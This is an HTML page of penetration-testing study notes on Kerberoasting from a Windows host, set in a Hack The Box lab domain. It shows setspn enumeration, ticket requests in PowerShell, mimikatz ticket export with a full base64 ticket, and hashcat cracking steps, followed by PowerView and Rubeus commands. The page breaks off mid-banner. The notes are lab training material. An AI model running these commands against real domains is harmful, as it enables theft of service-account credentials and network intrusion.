+<li class="toctree-l1"><a class="reference internal" href="../../tags/targetedKerberoast.py.html">targetedKerberoast.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/theharvester.html">theharvester</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ticketer.py.html">ticketer.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Transfer%20with%20Code.html">Transfer with Code</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Transferring%20File%20with%20GfxDownloadWrapper.exe.html">Transferring File with GfxDownloadWrapper.exe</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/tscon.exe.html">tscon.exe</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ufw.html">ufw</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Python%20Uploadserver.html">Python Uploadserver</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Using%20Bitsadmin%20to%20send%20and%20receive%20files.html">Using Bitsadmin to send and receive files</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Using%20Certutil%20to%20download.html">Using Certutil to download</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Using%20OpenSSL%20to%20send%20and%20receive%20files.html">Using OpenSSL to send and receive files</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Understanding%20User%20Privileges.html">Understanding User Privileges</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Virtual%20Hosts.html">Virtual Hosts</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/WAF.html">WAF</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/wafw00f.html">wafw00f</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/wappalyzer.html">wappalyzer</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/web%20shells.html">web shells</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Webdav.html">Webdav</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/wget.html">wget</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/whatweb.html">whatweb</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/White%20Box%20Testing.html">White Box Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/whois.html">whois</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/windapsearch.html">windapsearch</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20CMD.html">Windows CMD</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Lateral%20Movement.html">Windows Lateral Movement</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Local%20Password%20Attacks.html">Windows Local Password Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Pass%20The%20Hash.html">Windows Pass The Hash</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Pass%20The%20Ticket.html">Windows Pass The Ticket</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Passwords.html">Windows Passwords</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/winrm.html">winrm</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/WMI.html">WMI</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/wmiexec.py.html">wmiexec.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/wpscan.html">wpscan</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/xfreerdp.html">xfreerdp</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/xxd.html">xxd</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Celestial Security Reference</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Kerberoasting - from Windows</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/CPTS/Initial Access/Kerberoasting - from Windows.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="kerberoasting-from-windows">
+<h1>Kerberoasting - from Windows<a class="headerlink" href="#kerberoasting-from-windows" title="Link to this heading"></a></h1>
+<p>Date: 2024-12-26 11:42:19</p>
+<p>Status: #new</p>
+<p>Tags: <a class="reference internal" href="Active%20Directory%20Enumeration%20Attacks.html#active-directory-enumeration-attacks"><span class="std std-ref">Active Directory Enumeration Attacks</span></a></p>
+<section id="description">
+<h2>Description<a class="headerlink" href="#description" title="Link to this heading"></a></h2>
+<p><a class="reference internal" href="Kerberoasting%20-%20from%20Linux.html#kerberoasting-from-linux"><span class="std std-ref">Kerberoasting - from Linux</span></a></p>
+</section>
+<section id="kerberoasting-semi-manual-method">
+<h2>Kerberoasting - <strong>Semi Manual method</strong><a class="headerlink" href="#kerberoasting-semi-manual-method" title="Link to this heading"></a></h2>
+<p>This method has been depreciated for more automated modern tools, but worth mentioning in case these tools are not available,
+and worth mentioning to see what happens behind the scenes.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">C:\htb&gt; setspn.exe -Q */*</span>
+
+<span class="go">Checking domain DC=INLANEFREIGHT,DC=LOCAL</span>
+<span class="go">CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL</span>
+<span class="go">        exchangeAB/ACADEMY-EA-DC01</span>
+<span class="go">        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span>
+<span class="go">        TERMSRV/ACADEMY-EA-DC01</span>
+<span class="go">        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span>
+<span class="go">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span>
+<span class="go">        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL</span>
+<span class="go">        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL</span>
+
+<span class="go">&lt;SNIP&gt;</span>
+
+<span class="go">CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span>
+<span class="go">        backupjob/veam001.inlanefreight.local</span>
+<span class="go">CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span>
+<span class="go">        sts/inlanefreight.local</span>
+
+<span class="go">&lt;SNIP&gt;</span>
+
+
+<span class="go">CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span>
+<span class="go">        MSSQLSvc/SPSJDB.inlanefreight.local:1433</span>
+<span class="go">CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span>
+<span class="go">        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351</span>
+<span class="go">CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span>
+<span class="go">        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433</span>
+<span class="go">CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span>
+<span class="go">        adfsconnect/azure01.inlanefreight.local</span>
+
+<span class="go">Existing SPN found!</span>
+</pre></div>
+</div>
+<p>By using PowerShell, we can request TGS tickets for an account in the shell above and
+load them into memory. Once they are loaded into memory, we can extract them using Mimikatz.</p>
+<p>Let’s try this by targeting a single user:</p>
+</section>
+<section id="targeting-a-single-user">
+<h2>Targeting a Single User<a class="headerlink" href="#targeting-a-single-user" title="Link to this heading"></a></h2>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</span>
+
+<span class="n">Id</span>                   <span class="p">:</span> <span class="n">uuid</span><span class="p">-</span><span class="n">67a2100c</span><span class="p">-</span><span class="n">150f</span><span class="p">-</span><span class="n">477c-a28a</span><span class="p">-</span><span class="n">19f6cfed4e90</span><span class="p">-</span><span class="n">2</span>
+<span class="n">SecurityKeys</span>         <span class="p">:</span> <span class="p">{</span><span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">InMemorySymmetricSecurityKey</span><span class="p">}</span>
+<span class="n">ValidFrom</span>            <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2022</span> <span class="n">11</span><span class="p">:</span><span class="n">36</span><span class="p">:</span><span class="n">22</span> <span class="n">PM</span>
+<span class="n">ValidTo</span>              <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2022</span> <span class="n">8</span><span class="p">:</span><span class="n">55</span><span class="p">:</span><span class="n">25</span> <span class="n">AM</span>
+<span class="n">ServicePrincipalName</span> <span class="p">:</span> <span class="n">MSSQLSvc</span><span class="p">/</span><span class="n">DEV-PRE-SQL</span><span class="p">.</span><span class="n">inlanefreight</span><span class="p">.</span><span class="k">local:</span><span class="n">1433</span>
+<span class="n">SecurityKey</span>          <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">InMemorySymmetricSecurityKey</span>
+</pre></div>
+</div>
+</section>
+<section id="retrieving-all-tickets-using-setspn-exe">
+<h2>Retrieving All Tickets Using setspn.exe<a class="headerlink" href="#retrieving-all-tickets-using-setspn-exe" title="Link to this heading"></a></h2>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="n">setspn</span><span class="p">.</span><span class="n">exe</span> <span class="n">-T</span> <span class="n">INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span> <span class="n">-Q</span> <span class="p">*/*</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s1">&#39;^CN&#39;</span> <span class="n">-Context</span> <span class="n">0</span><span class="p">,</span><span class="n">1</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Context</span><span class="p">.</span><span class="n">PostContext</span><span class="p">[</span><span class="n">0</span><span class="p">].</span><span class="n">Trim</span><span class="p">()</span> <span class="p">}</span>
+
+<span class="n">Id</span>                   <span class="p">:</span> <span class="n">uuid</span><span class="p">-</span><span class="n">67a2100c</span><span class="p">-</span><span class="n">150f</span><span class="p">-</span><span class="n">477c-a28a</span><span class="p">-</span><span class="n">19f6cfed4e90</span><span class="p">-</span><span class="n">3</span>
+<span class="n">SecurityKeys</span>         <span class="p">:</span> <span class="p">{</span><span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">InMemorySymmetricSecurityKey</span><span class="p">}</span>
+<span class="n">ValidFrom</span>            <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2022</span> <span class="n">11</span><span class="p">:</span><span class="n">56</span><span class="p">:</span><span class="n">18</span> <span class="n">PM</span>
+<span class="n">ValidTo</span>              <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2022</span> <span class="n">8</span><span class="p">:</span><span class="n">55</span><span class="p">:</span><span class="n">25</span> <span class="n">AM</span>
+<span class="n">ServicePrincipalName</span> <span class="p">:</span> <span class="n">exchangeAB</span><span class="p">/</span><span class="n">ACADEMY-EA-DC01</span>
+<span class="n">SecurityKey</span>          <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">InMemorySymmetricSecurityKey</span>
+
+<span class="n">Id</span>                   <span class="p">:</span> <span class="n">uuid</span><span class="p">-</span><span class="n">67a2100c</span><span class="p">-</span><span class="n">150f</span><span class="p">-</span><span class="n">477c-a28a</span><span class="p">-</span><span class="n">19f6cfed4e90</span><span class="p">-</span><span class="n">4</span>
+<span class="n">SecurityKeys</span>         <span class="p">:</span> <span class="p">{</span><span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">InMemorySymmetricSecurityKey</span><span class="p">}</span>
+<span class="n">ValidFrom</span>            <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2022</span> <span class="n">11</span><span class="p">:</span><span class="n">56</span><span class="p">:</span><span class="n">18</span> <span class="n">PM</span>
+<span class="n">ValidTo</span>              <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2022</span> <span class="n">11</span><span class="p">:</span><span class="n">58</span><span class="p">:</span><span class="n">18</span> <span class="n">PM</span>
+<span class="n">ServicePrincipalName</span> <span class="p">:</span> <span class="n">kadmin</span><span class="p">/</span><span class="n">changepw</span>
+<span class="n">SecurityKey</span>          <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">InMemorySymmetricSecurityKey</span>
+
+<span class="n">Id</span>                   <span class="p">:</span> <span class="n">uuid</span><span class="p">-</span><span class="n">67a2100c</span><span class="p">-</span><span class="n">150f</span><span class="p">-</span><span class="n">477c-a28a</span><span class="p">-</span><span class="n">19f6cfed4e90</span><span class="p">-</span><span class="n">5</span>
+<span class="n">SecurityKeys</span>         <span class="p">:</span> <span class="p">{</span><span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">InMemorySymmetricSecurityKey</span><span class="p">}</span>
+<span class="n">ValidFrom</span>            <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2022</span> <span class="n">11</span><span class="p">:</span><span class="n">56</span><span class="p">:</span><span class="n">18</span> <span class="n">PM</span>
+<span class="n">ValidTo</span>              <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2022</span> <span class="n">8</span><span class="p">:</span><span class="n">55</span><span class="p">:</span><span class="n">25</span> <span class="n">AM</span>
+<span class="n">ServicePrincipalName</span> <span class="p">:</span> <span class="n">WSMAN</span><span class="p">/</span><span class="n">ACADEMY-EA-MS01</span>
+<span class="n">SecurityKey</span>          <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">InMemorySymmetricSecurityKey</span>
+
+<span class="p">&lt;</span><span class="n">SNIP</span><span class="p">&gt;</span>
+</pre></div>
+</div>
+</section>
+<section id="extracting-tickets-from-memory-with-mimikatz">
+<h2>Extracting Tickets from memory with <a class="reference internal" href="../../tags/mimikatz.html#mimikatz"><span class="std std-ref">mimikatz</span></a><a class="headerlink" href="#extracting-tickets-from-memory-with-mimikatz" title="Link to this heading"></a></h2>
+<p>In this example we are asking <a class="reference internal" href="../../tags/mimikatz.html#mimikatz"><span class="std std-ref">mimikatz</span></a> to output as Base64, this makes copy paste the hash back to your workstation easier ( in the case
+of restricted file transferring).  If you are able to transfer the file, skip the encoding and just export the file as is and skip the <cite>base64 /out:true</cite></p>
+<p>Step 1:  Get the hash from memory</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Using &#39;mimikatz.log&#39; for logfile : OK</span>
+
+<span class="go">mimikatz # base64 /out:true</span>
+<span class="go">isBase64InterceptInput  is false</span>
+<span class="go">isBase64InterceptOutput is true</span>
+
+<span class="go">mimikatz # kerberos::list /export</span>
+
+<span class="go">&lt;SNIP&gt;</span>
+
+<span class="go">[00000002] - 0x00000017 - rc4_hmac_nt</span>
+<span class="go">Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM</span>
+<span class="go">Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL</span>
+<span class="go">Client Name       : htb-student @ INLANEFREIGHT.LOCAL</span>
+<span class="go">Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;</span>
+<span class="go">====================</span>
+<span class="go">Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi</span>
+<span class="go">====================</span>
+<span class="go">doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO</span>
+<span class="go">RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T</span>
+<span class="go">UUwuaW5sYW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEvzCCBLugAwIBF6EDAgECooIE</span>
+<span class="go">rQSCBKmBMUn7JhVJpqG0ll7UnRuoeoyRtHxTS8JY1cl6z0M4QbLvJHi0JYZdx1w5</span>
+<span class="go">sdzn9Q3tzCn8ipeu+NUaIsVyDuYU/LZG4o2FS83CyLNiu/r2Lc2ZM8Ve/rqdd+TG</span>
+<span class="go">xvUkr+5caNrPy2YHKRogzfsO8UQFU1anKW4ztEB1S+f4d1SsLkhYNI4q67cnCy00</span>
+<span class="go">UEf4gOF6zAfieo91LDcryDpi1UII0SKIiT0yr9IQGR3TssVnl70acuNac6eCC+Uf</span>
+<span class="go">vyd7g9gYH/9aBc8hSBp7RizrAcN2HFCVJontEJmCfBfCk0Ex23G8UULFic1w7S6/</span>
+<span class="go">V9yj9iJvOyGElSk1VBRDMhC41712/sTraKRd7rw+fMkx7YdpMoU2dpEj9QQNZ3GR</span>
+<span class="go">XNvGyQFkZp+sctI6Yx/vJYBLXI7DloCkzClZkp7c40u+5q/xNby7smpBpLToi5No</span>
+<span class="go">ltRmKshJ9W19aAcb4TnPTfr2ZJcBUpf5tEza7wlsjQAlXsPmL3EF2QXQsvOc74Pb</span>
+<span class="go">TYEnGPlejJkSnzIHs4a0wy99V779QR4ZwhgUjRkCjrAQPWvpmuI6RU9vOwM50A0n</span>
+<span class="go">h580JZiTdZbK2tBorD2BWVKgU/h9h7JYR4S52DBQ7qmnxkdM3ibJD0o1RgdqQO03</span>
+<span class="go">TQBMRl9lRiNJnKFOnBFTgBLPAN7jFeLtREKTgiUC1/aFAi5h81aOHbJbXP5aibM4</span>
+<span class="go">eLbj2wXp2RrWOCD8t9BEnmat0T8e/O3dqVM52z3JGfHK/5aQ5Us+T5qM9pmKn5v1</span>
+<span class="go">XHou0shzgunaYPfKPCLgjMNZ8+9vRgOlry/CgwO/NgKrm8UgJuWMJ/skf9QhD0Uk</span>
+<span class="go">T9cUhGhbg3/pVzpTlk1UrP3n+WMCh2Tpm+p7dxOctlEyjoYuQ9iUY4KI6s6ZttT4</span>
+<span class="go">tmhBUNua3EMlQUO3fzLr5vvjCd3jt4MF/fD+YFBfkAC4nGfHXvbdQl4E++Ol6/LX</span>
+<span class="go">ihGjktgVop70jZRX+2x4DrTMB9+mjC6XBUeIlS9a2Syo0GLkpolnhgMC/ZYwF0r4</span>
+<span class="go">MuWZu1/KnPNB16EXaGjZBzeW3/vUjv6ZsiL0J06TBm3mRrPGDR3ZQHLdEh3QcGAk</span>
+<span class="go">0Rc4p16+tbeGWlUFIg0PA66m01mhfzxbZCSYmzG25S0cVYOTqjToEgT7EHN0qIhN</span>
+<span class="go">yxb2xZp2oAIgBP2SFzS4cZ6GlLoNf4frRvVgevTrHGgba1FA28lKnqf122rkxx+8</span>
+<span class="go">ECSiW3esAL3FSdZjc9OQZDvo8QB5MKQSTpnU/LYXfb1WafsGFw07inXbmSgWS1Xk</span>
+<span class="go">VNCOd/kXsd0uZI2cfrDLK4yg7/ikTR6l/dZ+Adp5BHpKFAb3YfXjtpRM6+1FN56h</span>
+<span class="go">TnoCfIQ/pAXAfIOFohAvB5Z6fLSIP0TuctSqejiycB53N0AWoBGT9bF4409M8tjq</span>
+<span class="go">32UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm</span>
+<span class="go">5oZV57Di6I584CgeD1VN6C2d5sTZyNKjb85lu7M3pBUDDOHQPAD9l4Ovtd8O6Pur</span>
+<span class="go">+jWFIa2EXm0H/efTTyMR665uahGdYNiZRnpm+ZfCc9LfczUPLWxUOOcaBX/uq6OC</span>
+<span class="go">AQEwgf6gAwIBAKKB9gSB832B8DCB7aCB6jCB5zCB5KAbMBmgAwIBF6ESBBB3DAVi</span>
+<span class="go">Ys6KmIFpubCAqyQcoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGDAWoAMCAQGhDzAN</span>
+<span class="go">GwtodGItc3R1ZGVudKMHAwUAQKEAAKURGA8yMDIyMDIyNDIzMzYyMlqmERgPMjAy</span>
+<span class="go">MjAyMjUwODU1MjVapxEYDzIwMjIwMzAzMjI1NTI1WqgVGxNJTkxBTkVGUkVJR0hU</span>
+<span class="go">LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu</span>
+<span class="go">ZWZyZWlnaHQubG9jYWw6MTQzMw==</span>
+<span class="go">====================</span>
+
+<span class="go">* Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi</span>
+
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+</div>
+</section>
+<section id="step-2-preparing-the-base64-blob-for-cracking">
+<h2>Step 2: Preparing the base64 blob for cracking<a class="headerlink" href="#step-2-preparing-the-base64-blob-for-cracking" title="Link to this heading"></a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Temen@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;base64 blob&gt;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="se">\\</span>n
+</pre></div>
+</div>
+<p>You can also decode and place the output into a .kirbi file with:</p>
+<p>There is a utility (<a class="reference external" href="https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py">https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py</a>)
+that allows you to extract the password hash called kirbi2john.py</p>
+<p>Step 3: convert the file</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Temen@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>python2.7<span class="w"> </span>kirbi2john.py<span class="w"> </span>sqldev.kirbi
+</pre></div>
+</div>
+<p>To use this file with <a class="reference internal" href="../../tags/hashcat.html#hashcat"><span class="std std-ref">hashcat</span></a> it must be modified.</p>
+<p>Step 4: prepare the file</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Temen@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>sed<span class="w"> </span><span class="s1">&#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39;</span><span class="w"> </span>crack_file<span class="w"> </span>&gt;<span class="w"> </span>sqldev_tgs_hashcat
+</pre></div>
+</div>
+<p>step 5: Now the hash can be cracked with <a class="reference internal" href="../../tags/hashcat.html#hashcat"><span class="std std-ref">hashcat</span></a></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Temen@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>sqldev_tgs_hashcat<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</pre></div>
+</div>
+</section>
+<section id="kerberoasting-semi-auto-method">
+<h2>Kerberoasting - <strong>Semi-auto method</strong><a class="headerlink" href="#kerberoasting-semi-auto-method" title="Link to this heading"></a></h2>
+<p>This method is performed on the Windows host, and the host requires access to:</p>
+<ul class="simple">
+<li><p><a class="reference internal" href="../../tags/powerview.html#powerview"><span class="std std-ref">powerview</span></a></p></li>
+</ul>
+<section id="extract-tgs-tickets-with-powerview">
+<h3>Extract TGS tickets with <a class="reference internal" href="../../tags/powerview.html#powerview"><span class="std std-ref">powerview</span></a><a class="headerlink" href="#extract-tgs-tickets-with-powerview" title="Link to this heading"></a></h3>
+<p>Listing accounts that hashes can be extracted</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">Get-DomainUser</span> <span class="p">*</span> <span class="n">-spn</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span>
+</pre></div>
+</div>
+<p>Using <a class="reference internal" href="../../tags/powerview.html#powerview"><span class="std std-ref">powerview</span></a> to target a specific user</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="n">sqldev</span> <span class="p">|</span> <span class="nb">Get-DomainSPNTicket</span> <span class="n">-Format</span> <span class="n">Hashcat</span>
+</pre></div>
+</div>
+<p>Using <a class="reference internal" href="../../tags/powerview.html#powerview"><span class="std std-ref">powerview</span></a> to export all tickets for offline cracking</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">Get-DomainUser</span> <span class="p">*</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">Get-DomainSPNTicket</span> <span class="n">-Format</span> <span class="n">Hashcat</span> <span class="p">|</span> <span class="nb">Export-Csv</span> <span class="p">.\</span><span class="n">ilfreight_tgs</span><span class="p">.</span><span class="n">csv</span> <span class="n">-NoTypeInformation</span>
+</pre></div>
+</div>
+</section>
+<section id="using-rubeus-to-target-kerberos">
+<h3>Using <a class="reference internal" href="../../tags/rubeus.html#rubeus"><span class="std std-ref">rubeus</span></a> to target kerberos<a class="headerlink" href="#using-rubeus-to-target-kerberos" title="Link to this heading"></a></h3>
+<p>This approach is modern, and many tasks below are automated.</p>
+<ul class="simple">
+<li><p>Performing Kerberoasting and outputting hashes to a file</p></li>
+<li><p>Using alternate credentials</p></li>
+<li><p>Performing Kerberoasting combined with a pass-the-ticket attack</p></li>
+<li><p>Performing “opsec” Kerberoasting to filter out AES-enabled accounts</p></li>
+<li><p>Requesting tickets for accounts passwords set between a specific date range</p></li>
+<li><p>Placing a limit on the number of tickets requested</p></li>
+<li><p>Performing AES Kerberoasting</p></li>
+</ul>
+<p>To get stats of the current state of the Kerberos implementation you can use the following:</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">stats</span>
+
+ <span class="n">______</span>        <span class="n">_</span>
+<span class="p">(</span><span class="n">_____</span> <span class="p">\</span>      <span class="p">|</span> <span class="p">|</span>
+<span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
